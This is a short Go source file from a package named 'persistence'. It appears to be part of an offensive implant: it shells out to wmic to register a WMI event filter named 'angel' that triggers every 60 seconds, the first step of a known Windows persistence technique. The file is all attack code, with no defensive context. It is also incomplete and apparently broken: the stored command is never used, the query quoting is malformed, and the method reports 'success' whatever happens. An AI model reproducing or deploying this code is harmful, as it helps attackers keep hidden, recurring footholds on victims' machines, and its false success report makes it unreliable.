package persistence

import "os/exec"

type WMIResult struct {
	Status string
}

type WMIPersistence struct {
	Command string
}

func (w WMIPersistence) Persist() WMIResult {
	cmd := exec.Command("wmic", "/namespace:\\\\root\\subscription", "path", "__EventFilter", "create", "name='angel'", "query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'", "querylanguage='WQL'")
	cmd.Run()
	return WMIResult{Status: "success"}
}
